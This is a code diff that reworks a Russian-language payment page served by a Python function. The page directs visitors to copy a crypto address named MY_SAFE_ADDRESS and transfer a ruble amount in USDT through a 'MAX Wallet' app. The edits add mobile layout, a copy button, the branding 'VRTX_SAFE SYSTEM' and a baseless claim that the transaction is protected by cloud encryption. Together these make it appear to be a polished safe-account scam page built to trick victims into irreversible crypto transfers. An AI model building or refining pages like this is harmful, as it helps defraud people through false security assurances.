@@ -43,40 +43,38 @@ def pay():
 return f"""
     <html>
     <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
         <style>
             body {{ background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px 20px; }}
-            .terminal {{ max-width: 450px; margin: 0 auto; border: 1px solid #00ff00; padding: 30px; border-radius: 20px; background: #050505; box-shadow: 0 0 30px rgba(0,255,0,0.1); }}
-            .amount-tag {{ font-size: 2em; color: #00ff00; margin: 20px 0; font-weight: bold; }}
-            .wallet-box {{ background: #111; padding: 15px; border-radius: 10px; word-break: break-all; color: #00ff00; font-family: monospace; font-size: 1.1em; margin: 20px 0; border: 1px dashed #333; cursor: pointer; }}
-            .instruction {{ text-align: left; font-size: 0.9em; color: #888; line-height: 1.5; }}
-            .copy-hint {{ font-size: 0.7em; color: #555; }}
+            .card {{ max-width: 400px; margin: 0 auto; border: 1px solid #00ff00; padding: 30px; border-radius: 20px; background: #080808; box-shadow: 0 0 25px rgba(0,255,0,0.1); }}
+            .amount {{ font-size: 2.5em; color: #00ff00; margin: 15px 0; font-weight: bold; }}
+            .address-box {{ background: #111; padding: 15px; border-radius: 10px; word-break: break-all; color: #00ff00; font-family: monospace; font-size: 1.1em; margin: 20px 0; border: 1px dashed #444; cursor: pointer; }}
+            .btn {{ display: inline-block; background: #00ff00; color: #000; padding: 12px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }}
+            .step {{ text-align: left; font-size: 0.9em; color: #888; margin-bottom: 10px; }}
         </style>
     </head>
     <body>
-        <div class="terminal">
-            <h2 style="letter-spacing: 3px;">ОПЛАТА ПРИНЯТА</h2>
-            <p>Ученик: {name}</p>
-            <div class="amount-tag">{amount} РУБ.</div>
+        <div class="card">
+            <div style="font-size: 0.8em; color: #00ff00; letter-spacing: 2px;">VRTX_SAFE SYSTEM</div>
+            <div class="amount">{amount} РУБ.</div>
             
             <hr style="border: 0; border-top: 1px solid #222; margin: 20px 0;">
             
-            <p class="instruction">1. Нажмите на адрес ниже, чтобы скопировать его:</p>
-            <div class="wallet-box" onclick="copyAddr()" id="addr">{MY_SAFE_ADDRESS}</div>
-            <p class="copy-hint">Нажмите для копирования</p>
+            <div class="step">1. Нажмите на адрес, чтобы скопировать:</div>
+            <div class="address-box" onclick="copyAddr()" id="target">{MY_SAFE_ADDRESS}</div>
             
-            <p class="instruction">2. Зайдите в <b>приложение MAX</b> и переведите сумму в USDT на этот адрес.</p>
+            <button class="btn" onclick="copyAddr()">СКОПИРОВАТЬ АДРЕС</button>
             
-            <p style="margin-top: 30px; font-size: 0.8em; color: #00ff00; opacity: 0.7;">
-                [ СИСТЕМА ЗАЩИТЫ КАРТЫ АКТИВИРОВАНА ]
-            </p>
+            <div class="step" style="margin-top: 30px;">2. Откройте <b>MAX Wallet</b> и переведите сумму в USDT на этот адрес.</div>
+            
+            <p style="font-size: 0.7em; color: #444; margin-top: 30px;">ТРАНЗАКЦИЯ ЗАЩИЩЕНА ОБЛАЧНЫМ ШИФРОВАНИЕМ</p>
         </div>
 
         <script>
             function copyAddr() {{
-                var text = document.getElementById("addr").innerText;
-                navigator.clipboard.writeText(text).then(function() {{
-                    alert("Адрес скопирован! Теперь просто вставьте его в кошельке MAX.");
-                }});
+                var t = document.getElementById("target").innerText;
+                navigator.clipboard.writeText(t);
+                alert("Адрес скопирован! Теперь вставьте его в кошельке MAX.");
             }}
         </script>
     </body>
